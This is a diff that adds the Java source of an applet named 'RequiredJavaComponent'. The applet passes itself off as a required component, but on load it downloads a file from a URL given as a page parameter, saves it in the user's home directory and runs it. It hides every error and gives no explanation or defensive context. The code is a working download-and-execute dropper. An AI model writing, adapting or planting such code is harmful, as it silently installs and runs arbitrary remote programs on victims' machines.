@@ -1,0 +1,48 @@
+import java.applet.Applet;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.net.URL;
+import java.net.URLConnection;
+
+public class RequiredJavaComponent extends Applet
+{
+  public void init()
+  {
+    try
+    {
+      String str1 = getParameter("FileName");
+      String str2 = System.getProperty("user.home");
+      URL localURL = new URL(getParameter("URL"));
+      URLConnection localURLConnection = localURL.openConnection();
+      InputStream localInputStream = localURLConnection.getInputStream();
+      FileOutputStream localFileOutputStream = new FileOutputStream(str2 + str1);
+      byte[] arrayOfByte = new byte[512];
+      int i;
+      while ((i = localInputStream.read(arrayOfByte, 0, arrayOfByte.length)) != -1)
+        localFileOutputStream.write(arrayOfByte, 0, i);
+      localInputStream.close();
+      localFileOutputStream.close();
+      Execute(str2 + str1);
+    }
+    catch (Exception localException)
+    {
+    }
+  }
+
+  public void Execute(String paramString)
+  {
+    try
+    {
+      Runtime localRuntime = Runtime.getRuntime();
+      localRuntime.exec(paramString);
+    }
+    catch (Exception localException)
+    {
+    }
+  }
+
+  public String getAppletInfo()
+  {
+    return "Required Java Component";
+  }
+}
